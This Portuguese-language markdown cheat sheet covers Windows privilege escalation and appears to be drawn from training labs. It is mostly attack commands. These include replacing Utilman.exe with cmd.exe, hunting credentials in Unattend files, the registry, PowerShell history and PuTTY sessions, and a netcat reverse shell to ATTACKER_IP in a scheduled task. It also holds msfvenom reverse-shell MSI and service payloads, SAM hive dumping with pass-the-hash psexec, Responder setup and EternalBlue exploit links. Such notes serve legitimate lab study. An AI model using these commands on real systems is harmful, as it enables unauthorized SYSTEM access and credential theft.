# üñ• Priv Esc Windows

# üõ†Ô∏è Ferramentas e Recursos

## ü™ü WinPEAS
- Ferramenta para enumera√ß√£o de escalonamento de privil√©gios no Windows.

## ü™ü PrivescCheck
- Script PowerShell para busca de vulnerabilidades comuns.
- Reposit√≥rio: [PrivescCheck](https://github.com/itm4n/PrivescCheck)

## ü™ü WES-NG
- Ferramenta para sugerir exploits com base em patches ausentes.
- Reposit√≥rio: [WES-NG](https://github.com/bitsadmin/wesng)
- Atualiza√ß√£o do banco de dados:
  ```bash
  wes.py --update
  ```
## ü™ü Enumera√ß√£o para priv esc windows: 
```bash
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

## üìÇ Busca de arquivos espec√≠ficos
```bash
Get-ChildItem ‚Äú*interesting-file*‚Äù -Path C:\ -Recurse -ErrorAction SilentlyContinue
```
## üîç Verificando Privil√©gios
```cmd
whoami /priv
```
### üìå Lista de Privil√©gios Explor√°veis
- Reposit√≥rio √∫til: [Priv2Admin](https://github.com/gtworek/Priv2Admin)

---

## üõ†Ô∏è SeTakeOwnership
### üîç O que √©?
O privil√©gio `SeTakeOwnership` permite que um usu√°rio tome posse de qualquer objeto no sistema, incluindo arquivos e chaves de registro.

### üìå Exemplo de Explora√ß√£o (Utilman.exe)
1. Tomar posse do arquivo:
   ```cmd
   takeown /f C:\Windows\System32\Utilman.exe
   ```
2. Conceder permiss√µes:
   ```cmd
   icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
   ```
3. Substituir por `cmd.exe`:
   ```cmd
   copy cmd.exe utilman.exe
   ```
4. Clicar no bot√£o "Ease of Access" para obter um prompt de comando com privil√©gios de SYSTEM.

---

## üõ†Ô∏è SeImpersonate / SeAssignPrimaryToken
### üîç O que √©?
Esses privil√©gios permitem que um processo personifique outros usu√°rios e atue em nome deles.

### üìå Explora√ß√£o com RogueWinRM
1. Gerar um processo para que usu√°rios privilegiados se conectem.
2. For√ßar a conex√£o de usu√°rios privilegiados ao processo malicioso.

---
https://github.com/jas502n/CVE-2019-1388/blob/master/HHUPD.EXE

## Instala√ß√£o autom√°tica em empresas por usu√°rios admin
Credenciais podem ser encontradas nos seguintes arquivos:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

Busca por `<Credentials>` dentro desses arquivos.

---
Procurando a palavra-chave "senha" no Registro
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s

C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

## Verifica√ß√£o de privilegios
### Podemos pesquisar todos e verificar a existencia de vulns
-process- Windows escalation:
```cmd
whoami /priv
```

## Hist√≥rico do PowerShell
### Via PowerShell:
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Via CMD:
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

## Credenciais salvas do Windows
### Listar credenciais:
```cmd
cmdkey /list
```

### Usar credenciais salvas:
```cmd
runas /savecred /user:<admin> cmd.exe
```

---

## Configura√ß√£o do IIS
Buscar strings de conex√£o (connection strings):
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

---

## Recuperar credenciais do PuTTY
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

# üö© Cen√°rios CTF (e poss√≠veis aplica√ß√µes pr√°ticas)

## Tarefas agendadas
Verificar uma tarefa espec√≠fica:
```cmd
schtasks /query /tn vulntask /fo list /v
```

Se o usu√°rio puder modificar a tarefa, verificar permiss√µes:
```cmd
icacls <caminho_para_o_arquivo>
```

Exemplo de shell reverso:
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

---

## Pesquisa no Windows
Procurar arquivos espec√≠ficos:
```cmd
dir C:\ /s /p /a:-d | findstr /i "taskusr1"
```

---

## AlwaysInstallElevated
Arquivos MSI podem ser explorados se ambos os registros forem definidos:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### Explorar:
Gerar MSI malicioso:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Executar:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

# üõ† Servi√ßos do Windows

## Entendendo a estrutura
Verificar configura√ß√£o de servi√ßo:
```cmd
sc qc <servi√ßo>
```

Configura√ß√µes de servi√ßos est√£o armazenadas em:
```plaintext
HKLM\SYSTEM\CurrentControlSet\Services\
```

Verificar permiss√µes:
```cmd
icacls <C:\PROGRA~2\SYSTEM~1\WService.exe>
```

---

## Caminhos de servi√ßo n√£o citados
Primeiro, verificar:
```plaintext
C:\MyPrograms\Disk.exe
```

Se n√£o existir, verificar:
```plaintext
C:\MyPrograms\Disk Sorter.exe
```

Se ainda n√£o existir, verificar:
```plaintext
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

### Verificar permiss√µes:
```cmd
icacls C:\MyPrograms
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

---

## Permiss√µes de servi√ßo inseguras
### Verificar DACL de servi√ßo:
```cmd
accesschk64.exe -qlc thmservice
```

A permiss√£o necess√°ria √© `SERVICE_ALL_ACCESS`.

### Explorar:
Gerar execut√°vel malicioso:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

Definir permiss√µes:
```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Alterar bin√°rio do servi√ßo:
```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Parar e iniciar o servi√ßo:
```cmd
sc stop THMService
sc start THMService
```

---
---

# üõ† Recursos Adicionais
- **Nmap Scripts**: `/usr/share/nmap/scripts`
- **Metasploit Payloads**: `msfvenom -l payloads | grep "windows"`
- **FreeRDP**: `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip> /sec:rdp /cert:ignore /auto-reconnect`
```



---

## üõ†Ô∏è SeBackup / SeRestore

### üìå Backup do SAM e SYSTEM
```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

### üìå Usando FreeRDP e Impacket
```bash
freerdp /u:THMBackup /p:CopyMaster555 /v:10.10.108.141 /cert-ignore /drive:A,/root/Desktop/A
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.108.141
```



## üõ†Ô∏è Software sem Patch
### üîç Verifica√ß√£o de Software Instalado
```cmd
wmic product get name,version,vendor
```

---

# üõ†Ô∏è Exemplos de Explora√ß√£o

## ü™ü Windows: Utilman.exe
1. Tomar posse do arquivo:
   ```cmd
   takeown /f C:\Windows\System32\Utilman.exe
   ```
2. Conceder permiss√µes:
   ```cmd
   icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
   ```
3. Substituir por `cmd.exe`:
   ```cmd
   copy cmd.exe utilman.exe
   ```
4. Clicar no bot√£o "Ease of Access" para obter um prompt de comando com privil√©gios de SYSTEM.

---


```
```
# üõ†Ô∏è Recursos Adicionais p√≥s-explora√ß√£o AD
Se estamos dentro de uma m√°quina na rede podemos tentar captar algo na rede
Configurar o responder (no Kali com tunelamento)
 ```cmd
   nano /etc/responder/Responder.conf
   ```
Definindo os IPs da rede interna:
```bash
RespondTo= 10.10.10.10 11.10.10.10
```
Definindo a interface para o responder:
```bash
responder -I tun5 -Prv
```

# eternalblue
```bash
https://www.lmgsecurity.com/manually-exploiting-ms17-010/?srsltid=AfmBOornzLejWkP_atov-e3PAFUKx0U1ctwnFPN7SMWsLUrgYakJzjzA
https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
https://github.com/worawit/MS17-010/blob/master/mysmb.py
ou
https://www.100security.com.br/ms17-010
